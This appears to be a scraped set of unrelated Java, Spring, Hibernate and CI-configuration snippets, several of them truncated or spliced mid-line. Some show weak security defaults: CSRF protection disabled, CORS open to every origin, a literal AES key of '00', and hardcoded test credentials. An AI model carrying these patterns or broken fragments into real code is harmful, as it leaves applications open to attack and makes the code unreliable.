import org.apache.maven.plugins.annotations.Parameter;
import org.apache.maven.project.MavenProject;
import org.apache.maven.shared.dependency.tree.DependencyNode;
import org.apache.maven.shared.dependency.tree.DependencyTreeBuilder;
import org.apache.maven.shared.dependency.tree.DependencyTreeBuilderException;
import org.apache.maven.shared.dependency.tree.traversal.CollectingDependencyNodeVisitor;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.jar.JarFile;

/**
 * Goal which launches the HuntBugs static analyzer tool.
 */
@Mojo(name = "huntbugs", defaultPhase = LifecyclePhase.PREPARE_PACKAGE, requiresProject = true, threadSafe = true)
public class HuntBugsMojo extends AbstractMojo {
    /**
     * Location of the file.
     */
    @Parameter(defaultValue = "${project.build.directory}/huntbugs", property = "outputDir", required = true)
    private File outputDirectory;

    /**
     * Location of classes to analyze
     */
    @Parameter(defaultValue = "${project.build.outputDirectory}", property = "classesDir", required = true)
    private File classesDirectory;

    /**
     * Minimal warning score to report
     */
    @Parameter(defaultValue = "30", property = "minScore", required = true)
    private int minScore;
    
    /**
     * Score to fail build
     */
    @Parameter(defaultValue = "0", property = "failScore", required = false)
    private int failScore;
    
    /**
     * Do not print progress messages
     */
    @Parameter(defaultValue = "false", property = "quiet", required = true)
    private boolean quiet;
    
    /**
     * If true and report already exists, generate diff report with previous version
     */
    @Parameter(defaultValue = "true", property = "diff", required = true)
    private boolean diff;
    
    @Parameter( defaultValue = "${project.compileClasspathElements}", readonly = true, required = true )
    private List<String> classpathElements;
    
    @Parameter( defaultValue = "${project}", readonly = true, required = true )
    private MavenProject project;

    @Parameter( defaultValue = "${session}", readonly = true, required = true )
    private MavenSession session;

    @Parameter(property = "skip", defaultValue = "false")
    private boolean skip;
    
    @Component
    private DependencyTreeBuilder treeBuilder;

    @Override
    public void execute() throws MojoExecutionException {
        if (!skip) {
            try {
                Context ctx = new Context(constructRepository(), constructOptions());

                if (!quiet) {
                    addAnalysisProgressListener(ctx);
                }

                ctx.analyzePackage("");
                writeReports(ctx);
            } catch (Exception e) {
                throw new MojoExecutionException("Failed to run HuntBugs", e);
            }
        }
    }
    
    private Repository constructRepository() throws IOException {
        Repository repo = new DirRepository(classesDirectory.toPath());
        
        if (!quiet) {
            getLog().info("HuntBugs: +dir " + classesDirectory);
        }

        // collecting project dependencies including pom and transitive dependencies
        ArtifactFilter artifactFilter = new ScopeArtifactFilter("compile");
        DependencyNode rootNode;
        try {
            rootNode = treeBuilder.buildDependencyTree(project, session.getLocalRepository(), artifactFilter);
        } catch (DependencyTreeBuilderException e) {
            throw new RuntimeException(e);
        }
        CollectingDependencyNodeVisitor visitor = new CollectingDependencyNodeVisitor();
        rootNode.accept(visitor);

        // converting dependencies to type loaders
        List<DependencyNode> nodes = visitor.getNodes();
        List<ITypeLoader> deps = new ArrayList<>();
        for (DependencyNode dependencyNode : nodes) {
            int state = dependencyNode.getState();

            // checking that transitive dependency is NOT excluded
            if (state == DependencyNode.INCLUDED) {
                Artifact artifact = dependencyNode.getArtifact();
                addDependency(artifact, deps);
            }
        }
        
        if (deps.isEmpty()) {
            return repo;
        }
        
        return new CompositeRepository(
            Arrays.asList(repo, new AuxRepository(new CompositeTypeLoader(deps.toArray(new ITypeLoader[0])))));
    }

    private void addDependency(Artifact art, List<ITypeLoader> deps) throws IOException {
        if ("compile".equals(art.getScope())) {
            ArtifactRepository localRepository = session.getLocalRepository();
            File f = localRepository.find(art).getFile();
            if (f != null) {
                Path path = f.toPath();
                if (!quiet) {
                    getLog().info("HuntBugs: +dep " + path);
                }
                if (Files.isRegularFile(path) && art.getType().equals("jar")) {
                    deps.add(new JarTypeLoader(new JarFile(path.toFile())));
                } else if (Files.isDirectory(path)) {
                    deps.add(new ClasspathTypeLoader(path.toString()));
                }
            }
        }
    }

    private AnalysisOptions constructOptions() {
        AnalysisOptions options = new AnalysisOptions();
        options.minScore = minScore;
        
        return options;
    }
    
    private void addAnalysisProgressListener(Context ctx) {
        long[] lastPrint = {0};
        ctx.addListener((stepName, className, count, total) -> {
            if (count == total || System.currentTimeMillis() - lastPrint[0] > 2000) {
                getLog().info("HuntBugs: " + stepName + " [" + count + "/" + total + "]");
                lastPrint[0] = System.currentTimeMillis();
            }
            return true;
        });
    }
    
    private void writeReports(Context ctx) throws Exception {
        getLog().info("HuntBugs: Writing report (" + ctx.getStat("Warnings") + " warnings)");
        Path path = outputDirectory.toPath();
        Files.createDirectories(path);
        Path xmlFile = path.resolve("report.xml");
        Path htmlFile = path.resolve("report.html");
        HuntBugsResult res = ctx;
        if(diff && Files.isRegularFile(xmlFile)) {
            res = Reports.diff(XmlReportReader.read(ctx, xmlFile), ctx);
        }
        Reports.write(xmlFile, htmlFile, res);
        if (failScore > 0 && res.warnings().mapToInt(Warning::getScore).anyMatch(score -> score >= failScore)) {
            throw new MojoFailureException("There are warnings with score higher than " + failScore);
        }
    }
}
--------------------------------------------------------------------------------------------------------
@WarningDefinition(category = "Performance", name = "WrongMapIteratorValues", maxScore = 55)
--------------------------------------------------------------------------------------------------------
language: java
python:
  - "2.7"
addons:
  apt:
    packages:
      - python-pip
      - python-virtualenv
      - wget
      - mercurial

# Use Trusty to get enough RAM
sudo: required
dist: trusty

env:
  global:
    - JVMCI_VERSION="jvmci-0.36"
    - JVMCI_BASE_JDK8="openjdk1.8.0_141"
    - JDK9_BUILD="181"
  matrix:
    - JDK="jdk8" GATE="style,fullbuild"
    - JDK="jdk8" GATE="build,test"
    - JDK="jdk8" GATE="build,bootstraplite"
    - JDK="jdk9" GATE="style,fullbuild"
    - JDK="jdk9" GATE="build,test"
    - JDK="jdk9" GATE="build,bootstraplite"
install:
  - |
      export MX_PATH=${TRAVIS_BUILD_DIR}/../mx
      git clone https://github.com/graalvm/mx.git ${MX_PATH}
      export PATH=${PATH}:${MX_PATH}
  - |
      if [[ ${GATE} == *style* ]]
      then
        virtualenv venv
        source venv/bin/activate
        pip install astroid==1.1.0
        pip install pylint==1.1.0
        export ECLIPSE_TAR=${TRAVIS_BUILD_DIR}/../eclipse.tar.gz
        wget http://archive.eclipse.org/eclipse/downloads/drops4/R-4.5.2-201602121500/eclipse-SDK-4.5.2-linux-gtk-x86_64.tar.gz -O ${ECLIPSE_TAR}
        tar -C ${TRAVIS_BUILD_DIR}/.. -xzf ${ECLIPSE_TAR}
        export ECLIPSE_EXE=${TRAVIS_BUILD_DIR}/../eclipse/eclipse
      fi
  - |
      if [[ ${GATE} == *fullbuild* ]]
      then
        # JDT is not supported on JDK9
        if [ "${JDK}" != "jdk9" ]
        then
          export JDT=${MX_PATH}/ecj.jar
          wget http://archive.eclipse.org/eclipse/downloads/drops4/R-4.5.2-201602121500/ecj-4.5.2.jar -O ${JDT}
        fi
      fi
  - |
      if [ "${JDK}" == "jdk8" ]
      then
        JDK_TAR=${TRAVIS_BUILD_DIR}/../jdk.tar.gz
        wget https://github.com/dougxc/openjdk8-jvmci-builder/releases/download/${JVMCI_VERSION}/${JVMCI_BASE_JDK8}-${JVMCI_VERSION}-linux-amd64.tar.gz -O ${JDK_TAR}
        tar -C ${TRAVIS_BUILD_DIR}/.. -xzf ${JDK_TAR}
        export JAVA_HOME=${TRAVIS_BUILD_DIR}/../${JVMCI_BASE_JDK8}-${JVMCI_VERSION}
      fi
  - |
      if [ "${JDK}" == "jdk9" ]
      then
        JDK_TAR=${TRAVIS_BUILD_DIR}/../jdk.tar.gz
        wget http://download.java.net/java/jdk9/archive/${JDK9_BUILD}/binaries/jdk-9+${JDK9_BUILD}_linux-x64_bin.tar.gz -O ${JDK_TAR}
        tar -C ${TRAVIS_BUILD_DIR}/.. -xzf ${JDK_TAR}
        export JAVA_HOME=${TRAVIS_BUILD_DIR}/../jdk-9
      fi
script:
  - echo ${JAVA_HOME}
  - ${JAVA_HOME}/bin/java -version
  - mx -v --primary-suite-path ${TRAVIS_BUILD_DIR}/compiler --java-home=${JAVA_HOME} gate --strict-mode --tags ${GATE}
after_failure:
  - cat hs_err*
--------------------------------------------------------------------------------------------------------
@FieldBridge(impl = ScanResultBridge.class)

spring:
  jpa:
    properties:
      javax:
        persistence:
          schema-generation:
            create-source: metadata
            scripts:
              action: create
              create-target: create.sql
--------------------------------------------------------------------------------------------------------
$ ./gradlew clean build && java -jar build/libs/gs-actuator-service-0.1.0.jar

--------------------------------------------------------------------------------------------------------
import java.util.Map;

import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.web.client.TestRestTemplate;
import org.springframework.boot.web.server.LocalServerPort;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.test.context.TestPropertySource;
import org.springframework.test.context.junit4.SpringRunner;

import static org.assertj.core.api.BDDAssertions.then;

/**
 * Basic integration tests for service demo application.
 *
 * @author Dave Syer
 */
@RunWith(SpringRunner.class)
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@TestPropertySource(properties = {"management.port=0"})
public class HelloWorldApplicationTests {

	@LocalServerPort
	private int port;

	@Value("${local.management.port}")
	private int mgt;

	@Autowired
	private TestRestTemplate testRestTemplate;

	@Test
	public void shouldReturn200WhenSendingRequestToController() throws Exception {
		@SuppressWarnings("rawtypes")
		ResponseEntity<Map> entity = this.testRestTemplate.getForEntity(
				"http://localhost:" + this.port + "/hello-world", Map.class);

		then(entity.getStatusCode()).isEqualTo(HttpStatus.OK);
	}

	@Test
	public void shouldReturn200WhenSendingRequestToManagementEndpoint() throws Exception {
		@SuppressWarnings("rawtypes")
		ResponseEntity<Map> entity = this.testRestTemplate.getForEntity(
				"http://localhost:" + this.mgt + "/actuator/info", Map.class);

		then(entity.getStatusCode()).isEqualTo(HttpStatus.OK);
	}

}
--------------------------------------------------------------------------------------------------------
@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {
 
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http.authorizeRequests()
          .antMatchers("/login").permitAll()
          .antMatchers("/foos/**").hasIpAddress("11.11.11.11")
          .anyRequest().authenticated()
          .and()
          .formLogin().permitAll()
          .and()
          .csrf().disable();
    }
 
    // ...
 
}

//...
.antMatchers("/foos/**")
.access("isAuthenticated() and hasIpAddress('11.11.11.11')")
//...

@Test
public void givenUser_whenGetHomePage_thenOK() {
    Response response = RestAssured.given().auth().form("john", "123")
      .get("http://localhost:8082/");
 
    assertEquals(200, response.getStatusCode());
    assertTrue(response.asString().contains("Welcome"));
}

@Test
public void givenUserWithWrongIP_whenGetFooById_thenForbidden() {
    Response response = RestAssured.given().auth().form("john", "123")
      .get("http://localhost:8082/foos/1");
 
    assertEquals(403, response.getStatusCode());
    assertTrue(response.asString().contains("Forbidden"));
}

@Component
public class CustomIpAuthenticationProvider implements AuthenticationProvider {
     
   Set<String> whitelist = new HashSet<String>();
 
    public CustomIpAuthenticationProvider() {
        whitelist.add("11.11.11.11");
        whitelist.add("12.12.12.12");
    }
 
    @Override
    public Authentication authenticate(Authentication auth) throws AuthenticationException {
        WebAuthenticationDetails details = (WebAuthenticationDetails) auth.getDetails();
        String userIp = details.getRemoteAddress();
        if(! whitelist.contains(userIp)){
            throw new BadCredentialsException("Invalid IP Address");
        }
        //...
}
--------------------------------------------------------------------------------------------------------
@Column(name="Price", columnDefinition="Decimal(10,2) default '100.00'")
--------------------------------------------------------------------------------------------------------
@Entity(name = "Event")
public static class Event {

	@Id
	@GeneratedValue
	private Long id;

	@Column(name = "`timestamp`")
	@FunctionCreationTimestamp
	private Date timestamp;

	//Constructors, getters, and setters are omitted for brevity
}

@ValueGenerationType(generatedBy = FunctionCreationValueGeneration.class)
@Retention(RetentionPolicy.RUNTIME)
public @interface FunctionCreationTimestamp {}

public static class FunctionCreationValueGeneration
		implements AnnotationValueGeneration<FunctionCreationTimestamp> {

	@Override
	public void initialize(FunctionCreationTimestamp annotation, Class<?> propertyType) {
	}

	/**
	 * Generate value on INSERT
	 * @return when to generate the value
	 */
	public GenerationTiming getGenerationTiming() {
		return GenerationTiming.INSERT;
	}

	/**
	 * Returns null because the value is generated by the database.
	 * @return null
	 */
	public ValueGenerator<?> getValueGenerator() {
		return null;
	}

	/**
	 * Returns true because the value is generated by the database.
	 * @return true
	 */
	public boolean referenceColumnInSql() {
		return true;
	}

	/**
	 * Returns the database-generated value
	 * @return database-generated value
	 */
	public String getDatabaseGeneratedReferencedColumnValue() {
		return "current_timestamp";
	}
}

@Entity(name = "Event")
public static class Event {

	@Id
	@GeneratedValue
	private Long id;

	@Column(name = "`timestamp`")
	@FunctionCreationTimestamp
	private Date timestamp;

	//Constructors, getters, and setters are omitted for brevity
}

@ValueGenerationType(generatedBy = FunctionCreationValueGeneration.class)
@Retention(RetentionPolicy.RUNTIME)
public @interface FunctionCreationTimestamp {}

public static class FunctionCreationValueGeneration
		implements AnnotationValueGeneration<FunctionCreationTimestamp> {

	@Override
	public void initialize(FunctionCreationTimestamp annotation, Class<?> propertyType) {
	}

	/**
	 * Generate value on INSERT
	 * @return when to generate the value
	 */
	public GenerationTiming getGenerationTiming() {
		return GenerationTiming.INSERT;
	}

	/**
	 * Returns the in-memory generated value
	 * @return {@code true}
	 */
	public ValueGenerator<?> getValueGenerator() {
		return (session, owner) -> new Date( );
	}

	/**
	 * Returns false because the value is generated by the database.
	 * @return false
	 */
	public boolean referenceColumnInSql() {
		return false;
	}

	/**
	 * Returns null because the value is generated in-memory.
	 * @return null
	 */
	public String getDatabaseGeneratedReferencedColumnValue() {
		return null;
	}
}

@Entity(name = "Employee")
public static class Employee {

	@Id
	private Long id;

	@NaturalId
	private String username;

	@Column(name = "pswd")
	@ColumnTransformer(
		read = "decrypt( 'AES', '00', pswd  )",
		write = "encrypt('AES', '00', ?)"
	)
	private String password;

	private int accessLevel;

	@ManyToOne(fetch = FetchType.LAZY)
	private Department department;

	@ManyToMany(mappedBy = "employees")
	private List<Project> projects = new ArrayList<>();

	//Getters and setters omitted for brevity
}

@Entity(name = "Savings")
public static class Savings {

	@Id
	private Long id;

	@Type(type = "org.hibernate.userguide.mapping.basic.MonetaryAmountUserType")
	@Columns(columns = {
		@Column(name = "money"),
		@Column(name = "currency")
	})
	@ColumnTransformer(
		forColumn = "money",
		read = "money / 100",
		write = "? * 100"
	)
	private MonetaryAmount wallet;

	//Getters and setters omitted for brevity

}

@Entity(name = "Account")
public static class Account {

	@Id
	private Long id;

	private Double credit;

	private Double rate;

	@Formula(value = "credit * rate")
	private Double interest;

	//Getters and setters omitted for brevity

}

public enum AccountType {
	DEBIT,
	CREDIT
}

@Entity(name = "Client")
public static class Client {

	@Id
	private Long id;

	private String name;

	@Where( clause = "account_type = 'DEBIT'")
	@OneToMany(mappedBy = "client")
	private List<Account> debitAccounts = new ArrayList<>( );

	@Where( clause = "account_type = 'CREDIT'")
	@OneToMany(mappedBy = "client")
	private List<Account> creditAccounts = new ArrayList<>( );

	//Getters and setters omitted for brevity

}

@Entity(name = "Account")
@Where( clause = "active = true" )
public static class Account {

	@Id
	private Long id;

	@ManyToOne
	private Client client;

	@Column(name = "account_type")
	@Enumerated(EnumType.STRING)
	private AccountType type;

	private Double amount;

	private Double rate;

	private boolean active;

	//Getters and setters omitted for brevity

}

@Entity(name = "Book")
public static class Book {

	@Id
	private Long id;

	private String title;

	private String author;

	@ManyToMany
	@JoinTable(
		name = "Book_Reader",
		joinColumns = @JoinColumn(name = "book_id"),
		inverseJoinColumns = @JoinColumn(name = "reader_id")
	)
	@WhereJoinTable( clause = "created_on > DATEADD( 'DAY', -7, CURRENT_TIMESTAMP() )")
	private List<Reader> currentWeekReaders = new ArrayList<>( );

	//Getters and setters omitted for brevity

}

@Entity(name = "Reader")
public static class Reader {

	@Id
	private Long id;

	private String name;

	//Getters and setters omitted for brevity

}

@Entity(name = "Account")
@Table(name = "account")
@SecondaryTable(
	name = "account_details"
)
@SQLDelete(
	sql = "UPDATE account_details SET deleted = true WHERE id = ? "
)
@FilterDef(
	name="activeAccount",
	parameters = @ParamDef(
		name="active",
		type="boolean"
	)
)
@Filter(
	name="activeAccount",
	condition="{a}.active = :active and {ad}.deleted = false",
	aliases = {
		@SqlFragmentAlias( alias = "a", table= "account"),
		@SqlFragmentAlias( alias = "ad", table= "account_details"),
	}
)
public static class Account {

	@Id
	private Long id;

	private Double amount;

	private Double rate;

	private boolean active;

	@Column(table = "account_details")
	private boolean deleted;

	//Getters and setters omitted for brevity

}


https://docs.jboss.org/hibernate/orm/5.3/userguide/html_single/Hibernate_User_Guide.html#annotations-hibernate-subselect
--------------------------------------------------------------------------------------------------------
			settings.getJpaProperties().setProperty("hibernate.connection.url", dbUrl);
			settings.getJpaProperties().setProperty("hibernate.connection.username", "sa");
			settings.getJpaProperties().setProperty("hibernate.connection.password", "");
			settings.getJpaProperties().setProperty("javax.persistence.schema-generation.scripts.action", settings.getAction().toSchemaGenerationAction());

			settings.getJpaProperties().setProperty("javax.persistence.schema-generation.scripts.create-target", outputFile.getAbsolutePath());
			settings.getJpaProperties().setProperty("javax.persistence.schema-generation.scripts.drop-target", outputFile.getAbsolutePath());

			settings.getJpaProperties().setProperty("hibernate.hbm2ddl.delimiter", settings.getDelimiter());
			settings.getJpaProperties().setProperty("hibernate.format_sql", String.valueOf(settings.isFormatOutput()));
--------------------------------------------------------------------------------------------------------
private static final String SEQUENCES_VIEW = "CREATE VIEW ALL_SEQUENCES(SEQUENCE_NAME, SEQUENCE_OWNER) AS SELECT SEQUENCE_NAME, '' FROM INFORMATION_SCHEMA.SEQUENCES;";
	private static final String EMPTY_SYNONYMS = "CREATE TABLE ALL_SYNONYMS (SYNONYM_NAME VARCHAR2(30), TABLE_OWNER VARCHAR2(30), TABLE_NAME VARCHAR2(30));";

--------------------------------------------------------------------------------------------------------
    @Parameter(
      names = "-explanations",
      description = "Path to side-car explanations",
      required = true
    )
--------------------------------------------------------------------------------------------------------
    private static BiConsumer<String, String> curry(final BiConsumer<String, String> consumer) {
        return (key, value) -> consumer.accept(key, value);
    }

    public static <X, Y, Z> Function<X, Function<Y, Z>> curry(final BiFunction<X, Y, Z> function) {
        return x -> y -> function.apply(x, y);
    }
--------------------------------------------------------------------------------------------------------
import org.hibernate.tool.hbm2ddl.SchemaExport;

public enum Action {
	CREATE(SchemaExport.Action.CREATE, "create"),
	DROP(SchemaExport.Action.DROP, "drop"),
	DROP_AND_CREATE(SchemaExport.Action.BOTH, "drop-and-create"),
	UPDATE(SchemaExport.Action.NONE, "update");

	private final SchemaExport.Action schemaExportAction;
	private final String schemaGenerationAction;

	Action(SchemaExport.Action schemaExportAction, String schemaGenerationAction) {
		this.schemaExportAction = schemaExportAction;
		this.schemaGenerationAction = schemaGenerationAction;
	}

	public SchemaExport.Action toSchemaExportAction() {
		return schemaExportAction;
	}

	public String toSchemaGenerationAction() {
		return schemaGenerationAction;
	}
}
--------------------------------------------------------------------------------------------------------
import static org.testng.Assert.assertEquals;
import static org.modelmapper.config.Configuration.AccessLevel;

import java.util.Arrays;
import java.util.List;

import org.modelmapper.AbstractTest;
import org.testng.annotations.Test;

@Test
public class DeepListTest extends AbstractTest {
  private int seq = 0;

  static class SrcObj {
    private List<SrcGroup> groups;

    public List<SrcGroup> getGroups() {
      return groups;
    }
  }

  static class SrcGroup {
    private List<SrcItem> items;

    public List<SrcItem> getItems() {
      return items;
    }
  }

  static class SrcItem {
    private String value;

    public String getValue() {
      return value;
    }
  }

  static class DestObj {
    protected List<DestGroup> groups;

    public List<DestGroup> getGroups() {
      return groups;
    }
  }

  static class DestGroup {
    protected List<DestItem> items;

    public List<DestItem> getItems() {
      return items;
    }
  }

  static class DestItem {
    protected String value;

    public String getValue() {
      return value;
    }
  }

  public void shouldMap() {
    modelMapper.getConfiguration().setMethodAccessLevel(AccessLevel.PUBLIC);
    modelMapper.getConfiguration().setFieldAccessLevel(AccessLevel.PROTECTED);

    SrcObj srcObj = new SrcObj();
    srcObj.groups = Arrays.asList(srcGroup(), srcGroup());

    DestObj destObj = modelMapper.map(srcObj, DestObj.class);

    assertEquals(destObj.groups.get(0).items.get(0).value, "foo1");
    assertEquals(destObj.groups.get(0).items.get(1).value, "foo2");
    assertEquals(destObj.groups.get(1).items.get(0).value, "foo3");
    assertEquals(destObj.groups.get(1).items.get(1).value, "foo4");
  }

  private SrcGroup srcGroup() {
    SrcGroup group = new SrcGroup();
    group.items = Arrays.asList(srcItem(), srcItem());
    return group;
  }

  private SrcItem srcItem() {
    SrcItem item = new SrcItem();
    item.value = "foo" + String.valueOf(++seq);
    return item;
  }
}
--------------------------------------------------------------------------------------------------------
//package com.paragon.microservices.distributor.system.converter;
//
//import com.paragon.microservices.distributor.model.dto.response.VersionResponse;
//import com.paragon.microservices.distributor.model.entity.VersionEntity;
//import com.paragon.microservices.distributor.model.entity.VersionInfoEntity;
//import com.paragon.microservices.distributor.model.formatter.VersionInfoFormatter;
//import org.modelmapper.Converter;
//import org.modelmapper.spi.MappingContext;
//import org.springframework.beans.factory.annotation.Autowired;
//import org.springframework.stereotype.Component;
//
//import java.util.Locale;
//
//@Component
//public class VersionEntityToVersionResponseConverter implements Converter<VersionEntity, VersionResponse> {
//
//    @Autowired
//    private VersionInfoFormatter formatter;
//
//    @Override
//    public VersionResponse convert(final MappingContext<VersionEntity, VersionResponse> context) {
//        final VersionEntity source = context.getSource();
//        final VersionResponse dest = new VersionResponse();
//        dest.setVersionInfo(this.getVersionInfo(source.getVersionInfo()));
//        dest.setChangeLog(source.getChangeLog());
//        dest.setLocale(source.getLocale());
//        dest.setId(source.getId());
//        return dest;
//    }
//
//    private String getVersionInfo(final VersionInfoEntity versionInfo) {
//        return this.formatter.print(versionInfo, Locale.getDefault());
//    }
//}

//package com.paragon.microservices.distributor.system.converter;
//
//import com.paragon.microservices.distributor.model.dto.response.VersionResponse;
//import com.paragon.microservices.distributor.model.entity.VersionEntity;
//import com.paragon.microservices.distributor.model.entity.VersionInfoEntity;
//import com.paragon.microservices.distributor.model.formatter.VersionInfoFormatter;
//import org.modelmapper.PropertyMap;
//import org.springframework.beans.factory.annotation.Autowired;
//import org.springframework.stereotype.Component;
//
//import java.util.Locale;
//
//@Component
//public class VersionEntityToVersionResponsePropertyMap extends PropertyMap<VersionEntity, VersionResponse> {
//
//    @Autowired
//    private VersionInfoFormatter formatter;
//
//    @Override
//    protected void configure() {
//        map(this.source.getVersionInfo()).setVersionInfo("test");
//    }
//
//    private String getVersionInfo(final VersionInfoEntity versionInfo) {
//        return this.formatter.print(versionInfo, Locale.getDefault());
//    }
//}
--------------------------------------------------------------------------------------------------------
public String create(@RequestBody JSONObject requestParams) {
      String name=requestParams.getString("name");
      List<Planet> planetArtifacts=requestParams.getJSONArray("artifacts").toJavaList(Planet.Class);
...
--------------------------------------------------------------------------------------------------------
@Component @Order(Ordered.HIGHEST_PRECEDENCE)
public class MultiTenancyFilter implements Filter {
    private final static Pattern pattern = Pattern.compile("^/(?<contextpath>[^/]+).*$");

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        final HttpServletRequest req = (HttpServletRequest) request;
        final String requestURI = req.getRequestURI();

        Matcher matcher = pattern.matcher(requestURI);
        if(matcher.matches()) {
            chain.doFilter(new HttpServletRequestWrapper(req) {
                @Override
                public String getContextPath() {
                    return "/"+matcher.group("contextpath");
                }
            }, response);
        }
    }

    @Override public void init(FilterConfig filterConfig) throws ServletException {}
    @Override public void destroy() {}
}

@Component @Order(Ordered.HIGHEST_PRECEDENCE)
public class MultiTenancyFilter extends OncePerRequestFilter {
    private final static Pattern pattern = Pattern.compile("^(?<contextPath>/[^/]+)(?<servletPath>.*)$");

    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException {
        Matcher matcher = pattern.matcher(request.getServletPath());
        if(matcher.matches()) {
            final String contextPath = matcher.group("contextPath");
            final String servletPath = matcher.group("servletPath");

            if(servletPath.trim().isEmpty()) {
                response.sendRedirect(contextPath+"/");
                return;
            }

            filterChain.doFilter(new HttpServletRequestWrapper(request) {
                @Override
                public String getContextPath() {
                    return contextPath;
                }
                @Override
                public String getServletPath() {
                    return servletPath;
                }
            }, response);
        } else {
            filterChain.doFilter(request, response);
        }
    }

    @Override
    protected String getAlreadyFilteredAttributeName() {
        return "multiTenancyFilter" + OncePerRequestFilter.ALREADY_FILTERED_SUFFIX;
    }
}
--------------------------------------------------------------------------------------------------------
# Number of ms to wait before throwing an exception if no connection is available.
spring.datasource.tomcat.max-wait=10000

# Maximum number of active connections that can be allocated from this pool at the same time.
spring.datasource.tomcat.max-active=50

# Validate the connection before borrowing it from the pool.
spring.datasource.tomcat.test-on-borrow=true
--------------------------------------------------------------------------------------------------------
# ===============================
# = H2 data source
# ===============================
spring:
  datasource:
    url: jdbc:h2:mem:spring-security-hibernate-test;DB_CLOSE_DELAY=-1;DB_CLOSE_ON_EXIT=FALSE
    platform: h2
    username: sa
    password:

# ===============================
# = JPA configurations
# ===============================
  jpa:
    show-sql: true
    hibernate:
      ddl-auto: create-drop
      naming-strategy: org.hibernate.cfg.ImprovedNamingStrategy
    database-platform: H2
--------------------------------------------------------------------------------------------------------
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;
import org.springframework.test.web.servlet.MockMvc;

import static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.httpBasic;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

@SpringBootTest
@ActiveProfiles("it")
@AutoConfigureMockMvc
@RunWith(SpringJUnit4ClassRunner.class)
public class BasicAuthenticationIntegrationTests {

    @Autowired
    private MockMvc mockMvc;

    @Test
    public void accessWithValidCredentials() throws Exception {
        this.mockMvc
                .perform(get("/users").with(httpBasic("info@memorynotfound.com", "password")))
                .andExpect(status().isOk());
    }

    @Test
    public void accessWithInValidCredentials() throws Exception {
        this.mockMvc
                .perform(get("/users").with(httpBasic("info@memorynotfound.com", "invalidPassword")))
                .andExpect(status().is4xxClientError());
    }

}
--------------------------------------------------------------------------------------------------------
If there are problems in this service, check the SQL Server Agent jobs. You can look up the regis
-
try for the “ErrorLogFile” key under HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft 
SQL Server\MSSQL12.SQL2014\SQLServerAge
--------------------------------------------------------------------------------------------------------
@Id
    @GeneratedValue(strategy = GenerationType.SEQUENCE, generator = "CUST_SEQ")
    @SequenceGenerator(sequenceName = "customer_seq", allocationSize = 1, name = "CUST_SEQ")
    Long id;
--------------------------------------------------------------------------------------------------------
        <dependency>
                <groupId>org.junit.platform</groupId>
                <artifactId>junit-platform-launcher</artifactId>
                <scope>test</scope>
                <version>${junit-platform.version}</version>
            </dependency>
            <dependency>
                <groupId>org.junit.platform</groupId>
                <artifactId>junit-platform-engine</artifactId>
                <scope>test</scope>
                <version>${junit-platform.version}</version>
            </dependency>
            <dependency>
                <groupId>org.junit.jupiter</groupId>
                <artifactId>junit-jupiter-api</artifactId>
                <scope>test</scope>
                <version>${junit-jupiter.version}</version>
            </dependency>
            <dependency>
                <groupId>org.junit.jupiter</groupId>
                <artifactId>junit-jupiter-engine</artifactId>
                <scope>test</scope>
                <version>${junit-jupiter.version}</version>
            </dependency>
--------------------------------------------------------------------------------------------------------
@SpringJUnitConfig
$ hostnamectl --static set-hostname dallas

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.context.event.ApplicationReadyEvent;
import org.springframework.context.ApplicationContext;
import org.springframework.context.ApplicationListener;
import org.springframework.core.env.Environment;

import java.net.InetAddress;
import java.net.UnknownHostException;

@SuppressWarnings("SpringJavaAutowiredFieldsWarningInspection")
@SpringBootApplication
class App implements ApplicationListener<ApplicationReadyEvent> {

    @Autowired
    private ApplicationContext applicationContext;

    public static void main(String[] args) {
        SpringApplication.run(App.class, args);
    }

    @Override
    public void onApplicationEvent(ApplicationReadyEvent event) {
        try {
            String ip = InetAddress.getLocalHost().getHostAddress();
            int port = applicationContext.getBean(Environment.class).getProperty("server.port", Integer.class, 8080);
            System.out.printf("%s:%d", ip, port);
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
    }
--------------------------------------------------------------------------------------------------------
@Bean
public WebMvcConfigurer corsConfigurer() {
	return new WebMvcConfigurerAdapter() {
		@Override
		public void addCorsMappings(CorsRegistry registry) {
			registry.addMapping("/**").allowedMethods("GET", "POST", "PUT", "DELETE").allowedOrigins("*")
				.allowedHeaders("*");
		}
	};
}
--------------------------------------------------------------------------------------------------------
import com.auth0.samples.authapi.user.ApplicationUser;

import com.fasterxml.jackson.databind.ObjectMapper;

import io.jsonwebtoken.Jwts;

import io.jsonwebtoken.SignatureAlgorithm;

import org.springframework.security.authentication.AuthenticationManager;

import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;

import org.springframework.security.core.Authentication;

import org.springframework.security.core.AuthenticationException;

import org.springframework.security.core.userdetails.User;

import org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;

import javax.servlet.FilterChain;

import javax.servlet.ServletException;

import javax.servlet.http.HttpServletRequest;

import javax.servlet.http.HttpServletResponse;

import java.io.IOException;

import java.util.ArrayList;

import java.util.Date;

